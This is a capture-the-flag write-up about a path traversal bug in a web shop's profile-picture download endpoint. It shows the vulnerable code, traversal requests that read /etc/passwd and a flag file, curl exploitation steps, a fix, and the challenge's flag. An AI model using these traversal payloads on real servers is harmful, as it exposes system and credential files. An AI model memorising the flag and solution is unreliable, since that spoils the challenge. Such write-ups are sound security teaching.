# CTF Challenge: Path Traversal via Profile Picture Download

**Category:** Web / Path Traversal  
**Difficulty:** Easy–Medium  
**Flag:** `CTF{p4th_tr4v3rs4l_pr0f1l3_pwn3d}`

---

## Description

LoopyMart allows users to upload a profile picture and later retrieve it through
a dedicated download endpoint.  The endpoint accepts a `filename` query-parameter
and reads the file straight from the server — but it never validates that the
resolved path stays inside the uploads directory.

---

## Vulnerability

- **Endpoint:** `GET /auth/profile-picture?filename=<value>`
- **File:** `backend/app/api/auth.py` → `serve_profile_picture()`
- **CWE:** CWE-22 Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

### Root Cause

```python
# ⚠️ VULNERABLE — no canonicalization / boundary check
file_path = uploads_dir / filename
```

`Path(uploads_dir) / filename` appends the user-supplied string verbatim.  
When `filename` contains `../` sequences the OS resolves them at `open()` time,
walking the filesystem freely.  The flag lives at `/tmp/path_traversal_flag.txt`
(written on every server startup).

---

## Exploitation

### Step-by-step (manual)

1. **Login** and obtain a JWT.

2. **Confirm the endpoint exists** — upload a real profile picture first, then
   fetch it by name:
   ```
   GET /auth/profile-picture?filename=profile_1_abc123.jpg
   ```

3. **Probe for traversal** — try a well-known readable file:
   ```
   GET /auth/profile-picture?filename=/../../../../../../etc/passwd
   Authorization: Bearer <token>
   ```
   A non-404 response with file content confirms the traversal works.

4. **Read the flag**:
   ```
   GET /auth/profile-picture?filename=/../../../../../../tmp/path_traversal_flag.txt
   Authorization: Bearer <token>
   ```
   Adjust the number of `../` to match the server's directory depth.
   (Try 4 – 12 levels; the solve script enumerates automatically.)

### Automated

```bash
python solutions/path-traversal-profile/solve.py \
    --email user@example.com \
    --password pass
```

### Manual (curl)

```bash
TOKEN=$(curl -s -X POST http://localhost:8001/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"pass"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Try with 8 levels (adjust as needed)
curl -s "http://localhost:8001/auth/profile-picture?filename=../../../../../../../../../../tmp/path_traversal_flag.txt" \
  -H "Authorization: Bearer $TOKEN"
```

---

## Mitigation

```python
# ✅ Secure version — reject any filename that escapes the uploads root
from pathlib import Path

uploads_dir = get_uploads_dir().resolve()
file_path = (uploads_dir / filename).resolve()

# Boundary check: resolved path must still start with uploads_dir
if not str(file_path).startswith(str(uploads_dir) + "/"):
    raise HTTPException(status_code=400, detail="Invalid filename")
```

Additional hardening:
- Strip leading `/`, `..`, and `./` from the filename before joining.
- Accept only an allowlist of characters (alphanumeric, `-`, `_`, `.`).
- Serve files through the already-mounted `/static` route instead of a custom read endpoint.

---

## Flag

```
CTF{p4th_tr4v3rs4l_pr0f1l3_pwn3d}
```
